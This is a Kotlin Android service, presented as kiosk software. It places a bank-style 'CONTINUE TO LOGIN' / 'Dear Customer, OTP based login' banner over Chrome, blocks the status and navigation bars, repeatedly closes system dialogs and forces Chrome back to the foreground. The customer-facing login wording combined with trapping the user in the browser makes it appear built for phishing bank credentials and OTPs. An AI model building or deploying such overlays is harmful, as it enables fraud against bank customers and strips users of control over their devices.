package com.span.sbicms

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.*
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class OverlayService : Service() {

    private var overlayView: View? = null
    private var systemUIBlocker: View? = null
    private var windowManager: WindowManager? = null
    private var serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var chromeMonitorJob: Job? = null
    private var systemUIEnforcerJob: Job? = null

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "overlay_service_channel"
        private const val CHROME_PACKAGE_NAME = "com.android.chrome"
        private val CHROME_PACKAGES = listOf(
            "com.android.chrome",
            "com.chrome.beta",
            "com.chrome.dev",
            "com.chrome.canary"
        )
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("KioskApp", "OverlayService onStartCommand called")
        startForeground(NOTIFICATION_ID, createNotification())

        // Show overlay
        showOverlay()

        // Create system UI blockers
        createSystemUIBlockers()

        // Start monitoring and enforcement
        startChromeMonitoring()
        startSystemUIEnforcement()

        return START_STICKY
    }

    private fun createSystemUIBlockers() {
        try {
            // Create invisible views to block system UI areas
            createStatusBarBlocker()
            createNavigationBarBlocker()
            android.util.Log.d("KioskApp", "System UI blockers created")
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Failed to create system UI blockers", e)
        }
    }

    private fun createStatusBarBlocker() {
        try {
            val displayMetrics = DisplayMetrics()
            windowManager?.defaultDisplay?.getRealMetrics(displayMetrics)

            val statusBarHeight = getStatusBarHeight()
            if (statusBarHeight > 0) {
                val statusBarBlocker = View(this).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    isClickable = true
                    isFocusable = false
                }

                val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    statusBarHeight,
                    layoutFlag,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.TOP
                    x = 0
                    y = 0
                }

                windowManager?.addView(statusBarBlocker, params)
                android.util.Log.d("KioskApp", "Status bar blocker added")
            }
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Failed to create status bar blocker", e)
        }
    }

    private fun createNavigationBarBlocker() {
        try {
            val displayMetrics = DisplayMetrics()
            windowManager?.defaultDisplay?.getRealMetrics(displayMetrics)

            val navBarHeight = getNavigationBarHeight()
            if (navBarHeight > 0) {
                val navBarBlocker = View(this).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    isClickable = true
                    isFocusable = false
                }

                val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    navBarHeight,
                    layoutFlag,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.BOTTOM
                    x = 0
                    y = 0
                }

                windowManager?.addView(navBarBlocker, params)
                android.util.Log.d("KioskApp", "Navigation bar blocker added")
            }
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Failed to create navigation bar blocker", e)
        }
    }

    private fun getStatusBarHeight(): Int {
        val resourceId = resources.getIdentifier("status_bar_height", "dimen", "android")
        return if (resourceId > 0) resources.getDimensionPixelSize(resourceId) else 0
    }

    private fun getNavigationBarHeight(): Int {
        val resourceId = resources.getIdentifier("navigation_bar_height", "dimen", "android")
        return if (resourceId > 0) resources.getDimensionPixelSize(resourceId) else 0
    }

    private fun startSystemUIEnforcement() {
        systemUIEnforcerJob?.cancel()
        systemUIEnforcerJob = serviceScope.launch {
            android.util.Log.d("KioskApp", "Starting aggressive system UI enforcement")

            while (isActive) {
                delay(1000) // Check every second
                try {
                    enforceSystemUIHiding()
                } catch (e: Exception) {
                    android.util.Log.e("KioskApp", "Error in system UI enforcement", e)
                }
            }
        }
    }

    private fun enforceSystemUIHiding() {
        try {
            // Send broadcast to any listening activities to enforce immersive mode
            val intent = Intent("com.span.sbicms.ENFORCE_IMMERSIVE")
            sendBroadcast(intent)

            // Try to collapse status bar (requires system permissions on newer Android)
            try {
                @Suppress("DEPRECATION")
                val service = getSystemService("statusbar")
                val statusBarManager = Class.forName("android.app.StatusBarManager")
                val collapse = statusBarManager.getMethod("collapsePanels")
                collapse.invoke(service)
            } catch (e: Exception) {
                // Expected to fail on newer Android versions
            }

            // Try to close system dialogs
            try {
                val closeDialogIntent = Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
                sendBroadcast(closeDialogIntent)
            } catch (e: Exception) {
                // May fail on newer Android versions
            }

            android.util.Log.d("KioskApp", "System UI enforcement attempted")
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Failed to enforce system UI hiding", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Kiosk Overlay Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Maintains browser overlay for kiosk mode"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Kiosk Mode Active")
            .setContentText("Browser overlay and system control active")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun showOverlay() {
        if (overlayView != null) {
            android.util.Log.d("KioskApp", "Hiding existing overlay before showing new one")
            hideOverlay()
        }

        try {
            android.util.Log.d("KioskApp", "Creating overlay view")
            overlayView = createOverlayView()
            val layoutParams = createOverlayLayoutParams()

            android.util.Log.d("KioskApp", "Adding overlay to window manager")
            windowManager?.addView(overlayView, layoutParams)
            android.util.Log.d("KioskApp", "Overlay added successfully")
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Failed to show overlay", e)
            e.printStackTrace()
        }
    }

    private fun createOverlayView(): View {
        // Get display metrics from WindowManager instead of display
        val displayMetrics = DisplayMetrics()
        windowManager?.defaultDisplay?.getRealMetrics(displayMetrics)

        val screenWidth = displayMetrics.widthPixels
        val overlayHeight = (100 * displayMetrics.density).toInt() // 100dp converted to pixels

        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#1976D2")) // Blue color matching your image
            layoutParams = ViewGroup.LayoutParams(screenWidth, overlayHeight)
            gravity = Gravity.CENTER

            // Add content similar to your image
            addView(TextView(this@OverlayService).apply {
                text = "CONTINUE TO LOGIN"
                setTextColor(Color.WHITE)
                textSize = 16f
                gravity = Gravity.CENTER
                setPadding(16, 8, 16, 8)
            })

            addView(TextView(this@OverlayService).apply {
                text = "Dear Customer, OTP based login is\nintroduced for added security"
                setTextColor(Color.WHITE)
                textSize = 12f
                gravity = Gravity.CENTER
                setPadding(16, 4, 16, 8)
            })

            // Make it non-clickable so touches pass through to Chrome
            isClickable = false
            isFocusable = false
        }
    }

    private fun createOverlayLayoutParams(): WindowManager.LayoutParams {
        val layoutFlag = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            layoutFlag,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
            x = 0
            y = 0
        }
    }

    private fun startChromeMonitoring() {
        chromeMonitorJob?.cancel()
        chromeMonitorJob = serviceScope.launch {
            android.util.Log.d("KioskApp", "Starting Chrome monitoring")
            // Wait longer before starting monitoring to let Chrome fully load
            delay(10000) // 10 seconds initial delay

            var consecutiveFailures = 0

            while (isActive) {
                delay(8000) // Check every 8 seconds

                val isChromeRunning = isChromeInForeground()
                android.util.Log.d("KioskApp", "Chrome monitoring - Chrome running: $isChromeRunning")

                if (isChromeRunning) {
                    consecutiveFailures = 0
                    // Only check overlay if Chrome is definitely running
                    if (overlayView?.parent == null) {
                        android.util.Log.d("KioskApp", "Chrome running but overlay missing, reshowing overlay")
                        showOverlay()
                    }
                } else {
                    consecutiveFailures++
                    android.util.Log.d("KioskApp", "Chrome not detected, consecutive failures: $consecutiveFailures")

                    // Only try to launch Chrome after 2 consecutive failures (16 seconds)
                    if (consecutiveFailures >= 2) {
                        android.util.Log.d("KioskApp", "Chrome failures detected, attempting to relaunch")
                        launchChrome()
                        consecutiveFailures = 0 // Reset after attempting launch
                        delay(10000) // Extra delay after launching
                    }
                }
            }
        }
    }

    private fun isChromeInForeground(): Boolean {
        return try {
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            var chromeRunning = false

            // Method 1: Check if Chrome process exists
            val runningProcesses = activityManager.runningAppProcesses
            runningProcesses?.forEach { processInfo ->
                CHROME_PACKAGES.forEach { chromePackage ->
                    if (processInfo.processName.equals(chromePackage, ignoreCase = true) ||
                        processInfo.processName.startsWith("$chromePackage:", ignoreCase = true)) {
                        chromeRunning = true
                        android.util.Log.d("KioskApp", "Found Chrome process: ${processInfo.processName}")
                        return@forEach
                    }
                }
            }

            // Method 2: Check recent tasks (for newer Android versions)
            if (!chromeRunning && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                    val currentTime = System.currentTimeMillis()
                    val stats = usageStatsManager.queryUsageStats(
                        android.app.usage.UsageStatsManager.INTERVAL_BEST,
                        currentTime - 30000, // Last 30 seconds
                        currentTime
                    )

                    stats?.forEach { usageStat ->
                        CHROME_PACKAGES.forEach { chromePackage ->
                            if (usageStat.packageName.equals(chromePackage, ignoreCase = true) &&
                                usageStat.lastTimeUsed > currentTime - 20000) { // Used in last 20 seconds
                                chromeRunning = true
                                android.util.Log.d("KioskApp", "Found Chrome in recent usage: ${usageStat.packageName}")
                                return@forEach
                            }
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.d("KioskApp", "Usage stats not available: ${e.message}")
                }
            }

            android.util.Log.d("KioskApp", "Chrome detection result: $chromeRunning")
            return chromeRunning

        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Error detecting Chrome, assuming it's running", e)
            // If detection fails, assume Chrome is running to prevent aggressive launching
            return true
        }
    }

    private fun launchChrome() {
        try {
            android.util.Log.d("KioskApp", "OverlayService attempting to launch Chrome")

            // Find any Chrome variant installed
            var launchIntent: Intent? = null
            for (chromePackage in CHROME_PACKAGES) {
                launchIntent = packageManager.getLaunchIntentForPackage(chromePackage)
                if (launchIntent != null) {
                    android.util.Log.d("KioskApp", "Found Chrome package: $chromePackage")
                    break
                }
            }

            launchIntent?.let {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                it.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                it.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                startActivity(it)
                android.util.Log.d("KioskApp", "OverlayService Chrome launch intent sent")

                // Record launch time for detection purposes
                getSharedPreferences("chrome_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putLong("last_chrome_launch", System.currentTimeMillis())
                    .apply()

            } ?: android.util.Log.e("KioskApp", "No Chrome package found")
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "OverlayService failed to launch Chrome", e)
        }
    }

    private fun hideOverlay() {
        try {
            overlayView?.let { view ->
                if (view.parent != null) {
                    windowManager?.removeView(view)
                }
            }
            overlayView = null
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Error hiding overlay", e)
        }
    }

    private fun hideSystemUIBlockers() {
        try {
            systemUIBlocker?.let { view ->
                if (view.parent != null) {
                    windowManager?.removeView(view)
                }
            }
            systemUIBlocker = null
        } catch (e: Exception) {
            android.util.Log.e("KioskApp", "Error hiding system UI blockers", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        android.util.Log.d("KioskApp", "OverlayService onDestroy")

        chromeMonitorJob?.cancel()
        systemUIEnforcerJob?.cancel()
        serviceScope.cancel()

        hideOverlay()
        hideSystemUIBlockers()
    }
}